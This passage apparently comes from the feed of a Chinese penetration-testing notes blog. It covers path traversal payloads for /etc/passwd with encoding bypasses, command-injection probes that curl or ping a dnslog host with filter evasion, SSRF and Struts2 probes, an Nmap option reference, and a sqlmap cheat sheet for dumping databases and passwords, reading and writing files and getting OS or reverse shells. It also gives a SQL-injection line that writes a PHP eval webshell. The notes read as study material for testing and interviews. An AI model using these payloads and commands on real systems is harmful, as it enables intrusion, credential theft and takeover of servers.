class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/././././././././././././././././././././././././../../../../../../etc/passwd      </span><br><span class="line">/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd </span><br><span class="line">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd </span><br><span class="line">/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</span><br><span class="line">/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd     </span><br><span class="line">/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/hosts</span><br></pre></td></tr></table></figure></li></ul></li><li><p>[后缀绕过]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/../../../../../../../../../../../etc/passwd#</span><br><span class="line">/../../../../../../../../../../../etc/passwd%00</span><br><span class="line">/../../../../../../../../../../../etc/passwd#.jpg</span><br><span class="line">/../../../../../../../../../../../etc/passwd%00.jpg</span><br><span class="line">/../../../../../../../../../../../etc/passwd#.html</span><br><span class="line">/../../../../../../../../../../../etc/passwd%00.html</span><br><span class="line">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#</span><br><span class="line">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#.jpg</span><br><span class="line">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#.html</span><br><span class="line">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00.jpg</span><br><span class="line">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00.html</span><br></pre></td></tr></table></figure></li></ul><p>[命令执行漏洞]</p><ul><li><p>[常规检测]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;curl [random].test.dnslog.link</span><br><span class="line"> | curl [random].test.dnslog.link</span><br><span class="line"> | ping -n 2 [random].test.dnslog.link [Windows]</span><br><span class="line"> | ping -c 2 [random].test.dnslog.link  [Linux]</span><br></pre></td></tr></table></figure></li><li><p>[绕过检测]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">;curl [random].test.dnslog.link#</span><br><span class="line"> | curl [random].test.dnslog.link#</span><br><span class="line">%20|%20curl%20[random].test.dnslog.link</span><br><span class="line">%20|%20curl%20[random].test.dnslog.link#</span><br><span class="line">%20|%20ping%20-n%202%20[random].test.dnslog.link</span><br><span class="line">%20|%20ping%20-c%202%20[random].test.dnslog.link#</span><br><span class="line">a=p;b=ing;c=c;d=2;$a$b -$c $d [random].test.dnslog.link</span><br><span class="line">a=c;b=url;$a$b [random].test.dnslog.link#</span><br><span class="line">$&#123;IFS&#125;|$&#123;IFS&#125;curl$&#123;IFS&#125;[random].test.dnslog.link</span><br><span class="line">$&#123;IFS&#125;|$&#123;IFS&#125;ping$&#123;IFS&#125;-c$&#123;IFS&#125;2$&#123;IFS&#125;[random].test.dnslog.link</span><br><span class="line">a=p;b=ing;c=c;d=2;$a$b&#123;IFS&#125;-$c&#123;IFS&#125;$d&#123;IFS&#125;[random].test.dnslog.link</span><br><span class="line">a=c;b=url;$a$b&#123;IFS&#125;[random].test.dnslog.link#</span><br></pre></td></tr></table></figure></li></ul><p>[ssrf漏洞]<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[random].test.dnslog.link/</span><br></pre></td></tr></table></figure></p><p>[strust2命令执行]<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?redirect:http://[random].test.dnslog.link/%25&#123;3*4&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;渗透测试基本流程&quot;&gt;&lt;a href=&quot;#渗透测试基本流程&quot; class=&quot;headerlink&quot; title=&quot;渗透测试基本流程&quot;&gt;&lt;/a&gt;渗透测试基本流程&lt;/h2&gt;&lt;p&gt;1.信息收集&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;服务器的相关信息（真实ip，系统类型，版本，开放端口
      
    
    </summary>
    
      <category term="Note" scheme="https://winthorlimo.github.io/categories/Note/"/>
    
    
      <category term="Interview" scheme="https://winthorlimo.github.io/tags/Interview/"/>
    
  </entry>
  
  <entry>
    <title>Nmap常用参数</title>
    <link href="https://winthorlimo.github.io/note/2020/undefined30/868037e0.html"/>
    <id>https://winthorlimo.github.io/note/2020/undefined30/868037e0.html</id>
    <published>2020-06-30T10:10:05.000Z</published>
    <updated>2020-07-13T14:24:09.376Z</updated>
    
    <content type="html"><![CDATA[<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><ul><li>语法结构：nmap [Scan Type(s)] [Options] {target specification}</li><li>端口状态介绍<ul><li>open：确定端口开放，可达</li><li>closed ：关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听。</li><li>filtered ：由于包过滤阻止探测报文到达端口，Nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙。</li><li>unfiltered ：未被过滤状态意味着端口可访问，但是Nmap无法确定它是开放还是关闭。 只有用于映射防火墙规则集的 ACK 扫描才会把端口分类到这个状态。</li><li>open | filtered ：无法确定端口是开放还是被过滤， 开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应。UDP，IP协议,FIN, Null 等扫描会引起。</li><li>closed|filtered：（关闭或者被过滤的）：无法确定端口是关闭的还是被过滤的</li></ul></li><li>扫描目标格式<ul><li>示例： scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254</li><li>-iL:从文件中加载目标</li><li>-iR:随机扫描</li><li>–exclude <host or network>:排除网段或主机地址</host></li><li>–excledefile:排除文件中的地址</li></ul></li><li>主机发现<ul><li>-sL:列出需要扫描的目标，不扫描</li><li>-sn:只做ping扫描，不做端口扫描</li><li>-Pn：跳过主机发现，视所有主机都在线</li><li>-PS/PA/PU/PY[portlist]：基于TCP（SYN、ACK）、UDP、SCTP的指定端口的主机发现</li><li>-PE/PP/PM：基于ICMP的echo、timestamp、network request的主机发现</li><li>-PO[Protocol list]：基于IP协议字段的ping扫描</li><li>-n/-R: -n表示不对目标最DNS解析，-R表示进行DNS解析，缺省为必要时候进行DNS解析</li><li>–dns-servers &lt;serv1[,serv2],…&gt;: 指定DNS 服务器</li><li>–system-dns:调用系统的DNS服务器</li><li>–traceroute：显示追踪到目标的路径</li></ul></li><li>扫描技术<ul><li>-sS/sT/sA/sW/sM:TCP扫描<ul><li>S是SYN扫描，半连接扫描，nmap只发送SYN报文，通过服务器是否响应SYN+ACK来判断对应端口是否开放</li><li>T是全连接扫描会和服务器建立完整的三次握手，效率低</li><li>A发送ACK报文，通过服务器响应来判断是否开放，有的服务器不开会回复ICMP端口不可达，当回复RST时表示可能被拦截或者端口开放，不是一个准确的判断条件</li><li>W 是窗口扫描，发出的报文和ACK一样，利用的是在某些系统中如果端口开放，收到ACK包后会响应一个窗口非0的RST包</li><li>M是Maimon扫描，使用发现者的名字命名。其原理是向目标服务器发送FIN/ACK 报文，在某些系统中如果端口开放则会丢弃该报文不做响应，如果端口关闭则回复RST或者ICMP，Nmap可借此判断服务器端口的开放情况。不准</li></ul></li><li>-sU：UDP扫描，某些系统如果UDP端口不开放会回复ICMP差错报文（这也是Linux系统中traceroute的实现原理）。Nmap UDP端口扫描的强大之处在于它会针对知名端口构造初始交互报文，比如会针对UDP 500构造一个主模式协商的IKE报文</li><li>-sN/sF/sX:特定TCP标志位的扫描，N是空标志位；F是FIN置位；X是Xmas扫描将FIN、PSH、URG同时置位。收到RST说明端口关闭，无响应说明被过滤或者端口开放，不准。</li><li>–scanflags <flags>：实现上同上面几种类似，可以让用户自定义TCP标志位。</flags></li><li>-sI <zombie host[:probeport]>: Idle扫描需要一台没有流量的僵尸主机，这种扫描的实现原理是在一定的时间里，同一台主机发出的IP数据报文其ip头中的identification字段是累加的。探测分为3步：1、Nmap主机向僵尸机发包，通过僵尸机的响应包探测其ID；2、Nmap主机伪造僵尸机源地址向服务器的特定端口发送SYN包；3、Nmap主机再次探测僵尸机的ip.id。如果目标服务器端口开放，则必然会向僵尸机发送SYN/ACK，由于莫名其妙收到一个SYN/ACK 报文，僵尸机会向目标服务器发送RST报文，该报文的ip.id 是第一步+1，则第三步Nmap主机探测到的ip.id应该是第一步+2，说明目标主机端口开放。反之，如果目标主机端口未开放，则收到第二步的报文后会向僵尸机回复RST或者直接丢弃该报文不响应，无论哪种情况，都不会触发僵尸机发包，进而僵尸机的ip.id不会变化，第三步Nmap探测到的id应该是第一步+1.</zombie></li><li>-sY/sZ:SCTP协议INIT或cookie-echo扫描</li><li>-sO:基于IP协议的扫描，通过变换IP报文头中的Protocol值来对服务器进行探测</li><li>-b <ftp relay host>:：FTP反弹扫描，借助FTP特性，通过FTP服务器连接想要扫描的主机实现隐身的目的</ftp></li></ul></li><li>端口相关参数<ul><li>-p:指定端口扫描范围，如：-p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9</li><li>–exclude-ports <port ranges>: 排除端口</port></li><li>-F：扫描比缺省少的端口（缺省1000，加了-F100）</li><li>-r：顺序扫描端口，缺省是随机分组扫描</li><li>–top-ports <number>:按top排序扫描知名端口</number></li><li>–port-ratio <ratio>: 按比例扫描知名端口，值在0-1之间，越小扫的越多</ratio></li></ul></li><li>系统/版本探测<ul><li>-sV:探测开放的端口的系统/服务信息</li><li>–version-intensity <level>:设置版本检测的详程度级别，0-9，越高越详细</level></li><li>–version-light：输出最可能的版本信息，缺省是2</li><li>–version-all：使用所有的探测条件进行版本/系统探测</li><li>–version-trace:打印详细的版本扫描过程</li></ul></li><li>脚本扫描<ul><li>–script=<lua scripts>:指定脚本名称</lua></li><li>–script-args=&lt;n1=v1,[n2=v2,…]&gt;:为脚本指定参数</li><li>–script-help=<lua scripts>: 查看脚本帮助信息</lua></li><li>–script-updatedb:更新脚本数据库</li></ul></li><li>系统探测<ul><li>-O:激活系统探测</li><li>–osscan-limit:只对开放端口的有效主机进行系统探测</li><li>–osscan-guess：推测系统信息</li></ul></li><li>其他<ul><li>-T<0-5>:时间模板，越大速度越快</0-5></li><li>-6：使能IPV6探测</li><li>-A：使能系统探测、版本检测、脚本扫描、路由追踪</li><li>-V：打印版本号</li><li>-v：增加输出的详细程度</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;nmap&quot;&gt;&lt;a href=&quot;#nmap&quot; class=&quot;headerlink&quot; title=&quot;nmap&quot;&gt;&lt;/a&gt;nmap&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;语法结构：nmap [Scan Type(s)] [Options] {target specification
      
    
    </summary>
    
      <category term="Note" scheme="https://winthorlimo.github.io/categories/Note/"/>
    
    
      <category term="Tools" scheme="https://winthorlimo.github.io/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>Sqlmap常用参数</title>
    <link href="https://winthorlimo.github.io/note/2020/undefined30/519cc.html"/>
    <id>https://winthorlimo.github.io/note/2020/undefined30/519cc.html</id>
    <published>2020-06-30T10:09:05.000Z</published>
    <updated>2020-07-13T14:20:42.097Z</updated>
    
    <content type="html"><![CDATA[<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><ul><li>-u #注入点</li><li>-f #指纹判别数据库类型</li><li>-b #获取数据库版本信息</li><li>-p #指定可测试的参数(?page=1&amp;id=2 -p “page,id”)</li><li>-D “” #指定数据库名</li><li>-T “” #指定表名</li><li>-C “” #指定字段</li><li>-s “” #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log”　　恢复:-s “xx.log” –resume)</li><li>–columns #列出字段- </li><li>–current-user #获取当前用户名称</li><li>–current-db #获取当前数据库名称</li><li>–users #列数据库所有用户</li><li>–passwords #数据库用户所有密码</li><li>–privileges #查看用户权限(–privileges -U root)</li><li>-U #指定数据库用户</li><li>–dbs #列出所有数据库</li><li>–tables -D “” #列出指定数据库中的表</li><li>–columns -T “user” -D “mysql” #列出mysql数据库中的user表的所有字段</li><li>–dump-all #列出所有数据库所有表</li><li>–exclude-sysdbs #只列出用户自己新建的数据库和表</li><li>–dump -T “” -D “” -C “” #列出指定数据库的表的字段的数据(–dump -T users -D master -C surname)</li><li>–dump -T “” -D “” –start 2 –top 4 # 列出指定数据库的表的2-4字段的数据<br>–dbms #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB)</li><li>–os #指定系统(Linux,Windows)</li><li>-v #详细的等级(0-6)<ul><li>0：只显示Python的回溯，错误和关键消息。</li><li>1：显示信息和警告消息。</li><li>2：显示调试消息。</li><li>3：有效载荷注入。</li><li>4：显示HTTP请求。</li><li>5：显示HTTP响应头。</li><li>6：显示HTTP响应页面的内容</li></ul></li><li>–privileges #查看权限</li><li>–is-dba #是否是数据库管理员</li><li>–roles #枚举数据库用户角色</li><li>–udf-inject #导入用户自定义函数（获取系统权限）</li><li>–union-check #是否支持union 注入</li><li>–union-cols #union 查询表记录</li><li>–union-test #union 语句测试</li><li>–union-use #采用union 注入</li><li>–union-tech orderby #union配合order by</li><li>–method “POST” –data “” #POST方式提交数据(–method “POST” –data “page=1&amp;id=2″)</li><li>–cookie “用;号分开” #cookie注入(–cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”)</li><li>–referer “” #使用referer欺骗(–referer “<a href="http://www.baidu.com”" target="_blank" rel="noopener">http://www.baidu.com”</a>)</li><li>–user-agent “” #自定义user-agent</li><li>–proxy “<a href="http://127.0.0.1:8118″" target="_blank" rel="noopener">http://127.0.0.1:8118″</a> #代理注入</li><li>–string “” #指定关键词</li><li>–threads 　　 #采用多线程(–threads 3)</li><li>–sql-shell #执行指定sql命令</li><li>–sql-query #执行指定的sql语句(–sql-query “SELECT password FROM mysql.user WHERE user = ‘root’ LIMIT 0, 1″ )</li><li>–file-read #读取指定文件</li><li>–file-write #写入本地文件(–file-write /test/test.txt –file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt)</li><li>–file-dest #要写入的文件绝对路径</li><li>–os-cmd=id #执行系统命令</li><li>–os-shell #系统交互shell</li><li>–os-pwn #反弹shell(–os-pwn –msf-path=/opt/framework/msf3/)</li><li>–msf-path= #matesploit绝对路径(–msf-path=/opt/framework/msf3/)</li><li>–os-smbrelay #</li><li>–os-bof #</li><li>–reg-read #读取win系统注册表</li><li>–priv-esc #</li><li>–time-sec= #延迟设置 默认–time-sec=5 为5秒</li><li>-p “user-agent” –user-agent “sqlmap/0.7rc1 (<a href="http://sqlmap.sourceforge.net)”" target="_blank" rel="noopener">http://sqlmap.sourceforge.net)”</a> #指定user-agent注入</li><li>–eta #盲注</li></ul><h3 id="1-基础用法："><a href="#1-基础用法：" class="headerlink" title="1. 基础用法："></a>1. 基础用法：</h3><ul><li>./sqlmap.py -u “注入地址” -v 1 –dbs   // 列举数据库</li><li>./sqlmap.py -u “注入地址” -v 1 –current-db   // 当前数据库</li><li>./sqlmap.py -u “注入地址” -v 1 –users    // 列数据库用户</li><li>./sqlmap.py -u “注入地址” -v 1 –current-user  // 当前用户</li><li>./sqlmap.py -u “注入地址” -v 1 –tables -D “数据库”   // 列举数据库的表名</li><li>./sqlmap.py -u “注入地址” -v 1 –columns -T “表名” -D “数据库”   // 获取表的列名</li><li>./sqlmap.py -u “注入地址” -v 1 –dump -C “字段,字段” -T “表名” -D “数据库”   // 获取表中的数据，包含列<br>已经开始拖库了，SQLMAP是非常人性化的，它会将获取的数据存储sqlmap/output/中</li></ul><h3 id="2-sqlmap-post注入"><a href="#2-sqlmap-post注入" class="headerlink" title="2. sqlmap post注入"></a>2. sqlmap post注入</h3><ul><li>在使用Sqlmap进行post型注入时，<br>经常会出现请求遗漏导致注入失败的情况。<br>一个小技巧，即结合burpsuite来使用sqlmap，<br>用这种方法进行post注入测试会更准确，操作起来也非常容易。<ol><li>浏览器打开目标地址http:// <a href="http://www.2cto.com" target="_blank" rel="noopener">www.2cto.com</a> /Login.asp</li><li>配置burp代理(127.0.0.1:8080)以拦截请求</li><li>点击login表单的submit按钮</li><li>如下图，这时候Burp会拦截到了我们的登录POST请求</li><li>把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下</li><li>运行sqlmap并使用如下命令：<br>./sqlmap.py -r search-test.txt -p tfUPass<br>这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，<br>而-p 大家应该比较熟悉，指定注入用的参数。</li></ol></li></ul><h3 id="3-sqlmap-cookies注入"><a href="#3-sqlmap-cookies注入" class="headerlink" title="3. sqlmap  cookies注入"></a>3. sqlmap  cookies注入</h3><ul><li>sqlmap.py -u “<a href="http://127.0.0.1/base.php&quot;" target="_blank" rel="noopener">http://127.0.0.1/base.php&quot;</a> –cookies “id=1”  –dbs –level 2</li><li>默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用–level 参数且数值&gt;=2的时候也会检查cookie时面的参数，当&gt;=3的时候将检查User-agent和Referer，那么这就很简单了，我们直接在原有的基础  上面加上 –level 2 即可<br>利用sqlmap cookies注入突破用户登录继续注入<br>先把用户登陆的cookie拿到吧，<br>在收藏夹添加一个链接cookies属性：<br>名字自己取<br>javascript:alert(document.cookie)，，需要获取当前cookie的时候，<br>直接点一下这个链接，然后复制一下弹出对话框<br>里的cookie值就搞定了<br>sqlmap.py -u <a href="http://x.x.x.x/Down.aspx?tid=2" target="_blank" rel="noopener">http://x.x.x.x/Down.aspx?tid=2</a> -p tid –dbms mssql –cookie=”info=username=test”<br>-p是指指定参数注入</li></ul><h3 id="4-sqlmap遇到url重写的注入"><a href="#4-sqlmap遇到url重写的注入" class="headerlink" title="4. sqlmap遇到url重写的注入"></a>4. sqlmap遇到url重写的注入</h3><ul><li>哪里存在注入就加上 <em> 号<br>./sqlmap.py -u “<a href="http://www.cunlide.com/id1/1" target="_blank" rel="noopener">http://www.cunlide.com/id1/1</a></em>/id2/2”</li></ul><h3 id="5-sqlmap-编码绕waf注入"><a href="#5-sqlmap-编码绕waf注入" class="headerlink" title="5. sqlmap 编码绕waf注入"></a>5. sqlmap 编码绕waf注入</h3><p>在sqlmap 的 tamper目录下有很多space2morehash.py 编码脚本自行加载</p><ul><li>./sqlmap.py -u <a href="http://127.0.0.1/test.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/test.php?id=1</a> -v 3 –dbms “MySQL” –technique U -p id –batch –tamper “space2morehash.py”</li></ul><p>sqlmap读文件</p><ul><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–file-read “/etc/passwd”</li></ul><p>sqlmap写文件</p><ul><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–file-write /localhost/mm.php –file-dest/var/www/html/xx.php -v 2</li></ul><p>sqlmap分段脱裤</p><ul><li>sqlmap.py -u url -D “data”  -T “tables” -C “username,password,email” –dump –threads=5 –start=1 –stop=5000<br>其他基础：</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;" target="_blank" rel="noopener">http://url/news?id=1&quot;</a> –level=3 –smart –dbms “Mysql” –current-user #获取当前用户名称</li><li>sqlmap -u “<a href="http://www.xxoo.com/news?id=1&quot;" target="_blank" rel="noopener">http://www.xxoo.com/news?id=1&quot;</a> –level=3 –smart –dbms “Mysql” –current-db  #获取当前数据库名称</li><li>sqlmap -u “<a href="http://www.xxoo.com/news?id=1&quot;" target="_blank" rel="noopener">http://www.xxoo.com/news?id=1&quot;</a> –level=3 –smart –dbms “Mysql”–tables  -D “db_name” #列表名</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;" target="_blank" rel="noopener">http://url/news?id=1&quot;</a> –level=3 –smart  –dbms “Mysql” –columns -T “tablename” users-D “db_name” -v 0 #列字段</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;" target="_blank" rel="noopener">http://url/news?id=1&quot;</a> –level=3 –smart –dbms “Mysql”  –dump  -C “column_name”  -T “table_name” -D “db_name” -v 0   #获取字段内容</li></ul><h2 id="信息获取"><a href="#信息获取" class="headerlink" title="信息获取"></a>信息获取</h2><ul><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –users  #列数据库用户</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –dbs#列数据库</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–passwords #数据库用户密码</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–passwords-U root  -v 0 #列出指定用户数据库密码</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –dump-all -v 0 #列出所有数据库所有表 </li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–privileges #查看权限</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–privileges -U root #查看指定用户权限</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –is-dba -v 1 #是否是数据库管理员</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –roles #枚举数据库用户角色</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–udf-inject #导入用户自定义函数（获取系统权限！）</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–dump-all –exclude-sysdbs -v 0 #列出当前库所有表</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” - –union-check #是否支持union 注入</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–union-cols #union 查询表记录</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –union-test #union 语句测试</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –union-use –banner #采用union 注入</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–union-test –union-tech orderby #union 配合 order by</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–method “POST” – data “id=1&amp;cat=2” #post注入</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–cookie “COOKIE_VALUE” #cookie注入</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”-b #获取banner信息</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;" target="_blank" rel="noopener">http://url/news?id=1&quot;</a> –level=3 –smart-v 1 -f #指纹判别数据库类型</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;" target="_blank" rel="noopener">http://url/news?id=1&quot;</a> –level=3 –smart–proxy”<a href="http://127.0.0.1:8118&quot;" target="_blank" rel="noopener">http://127.0.0.1:8118&quot;</a> #代理注入</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--string&quot;STRING_ON_TRUE_PAGE&quot;" target="_blank" rel="noopener">http://url/news?id=1&quot;--string&quot;STRING_ON_TRUE_PAGE&quot;</a>  #指定关键词</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–sql-shell #执行指定sql命令</li></ul><ul><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–os-cmd=whoami #执行系统命令</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–os-shell #系统交互shell</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–os-pwn #反弹shell</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–reg-read #读取win系统注册表</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –dbs-o “sqlmap.log” #保存进度</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –dbs  -o “sqlmap.log” –resume  #恢复已保存进度</li></ul><ul><li>./sqlmap.py -u “<a href="http://www.91ri.org/" target="_blank" rel="noopener">http://www.91ri.org/</a> id1/1*/id2/2″<br>“Show.asp” –cookie “id=9” –table –level 2<br>–forms<br>–data “data”<br>–delay 0.5<br>–safe-freq  25<br>-v 3 –dbs  –batch –tamper “base64encode.py”<br>sqlmap.py -u url -D “data”  -T “tables” -C “username,password,email” –dump-all -v </li></ul><h2 id="传统的sql语句写shell"><a href="#传统的sql语句写shell" class="headerlink" title="传统的sql语句写shell"></a>传统的sql语句写shell</h2><p>通过sql注入select into outfile实现，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select 1,&apos;&lt;?php eval($_POST[a]);?&gt;&apos; INTO OUTFILE &apos;/var/www/tmp/nb.php&apos;#</span><br></pre></td></tr></table></figure><p>dumpfile、file_put_contents</p><p>outfile不能用了怎么办？<code>select unhex(&#39;udf.dll hex code&#39;) into dumpfile &#39;c:/mysql/mysqlserver 5.1/lib/plugin/xxoo.dll&#39;</code>;可以 UDF提权<a href="https://www.cnblogs.com/milantgh/p/5444398.html" target="_blank" rel="noopener">https://www.cnblogs.com/milantgh/p/5444398.html</a></p><p>outfile适合导库，在行末会写入新行并转义，因此不能写入二进制可执行文件。</p><p>写shell条件</p><ul><li>文件名必须是绝对路径</li><li>用户必须有写文件权限</li></ul><h2 id="sqlmap写shell"><a href="#sqlmap写shell" class="headerlink" title="sqlmap写shell"></a>sqlmap写shell</h2><p>前提需要对目录具有写权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--os-cmd=&quot;net user&quot;</span><br></pre></td></tr></table></figure><p>交互式命令执行，注意在使用交互式方式时需知道网站的绝对路径，执行成功后在绝对路径下创建文件返回结果，然后再自动删除。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--os-shell</span><br></pre></td></tr></table></figure><p>写webshell，会生成两个文件，tmpbshrd.php和tmpucnll.php，分别为命令执行和文件上传webshell</p><p>关闭sqlmap文件就会被删除</p><h2 id="常见数据库端口号"><a href="#常见数据库端口号" class="headerlink" 